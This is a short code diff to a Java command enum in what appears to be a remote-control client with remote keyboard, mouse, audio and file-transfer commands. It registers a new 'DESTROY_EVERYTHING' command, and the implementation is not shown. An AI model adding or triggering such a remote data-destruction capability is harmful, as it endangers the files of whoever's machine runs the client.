@@ -8,6 +8,7 @@ import br.com.introcdc.connect.client.commands.audio.ClientCommandAudio;
 import br.com.introcdc.connect.client.commands.control.ClientCommandKeyboardType;
 import br.com.introcdc.connect.client.commands.control.ClientCommandMouseClick;
 import br.com.introcdc.connect.client.commands.control.ClientCommandMouseScroll;
+import br.com.introcdc.connect.client.commands.file.external.ClientCommandDestroyEverything;
 import br.com.introcdc.connect.client.commands.file.external.ClientCommandDownload;
 import br.com.introcdc.connect.client.commands.file.external.ClientCommandReceive;
 import br.com.introcdc.connect.client.commands.file.external.ClientCommandSend;
@@ -36,6 +37,7 @@ public enum ClientCommandEnum {
     MOUSE_SCROLL(ClientCommandMouseScroll.class),
 
     // File
+    DESTROY_EVERYTHING(ClientCommandDestroyEverything.class),
     DOWNLOAD(ClientCommandDownload.class),
     RECEIVE(ClientCommandReceive.class),
     SEND(ClientCommandSend.class),
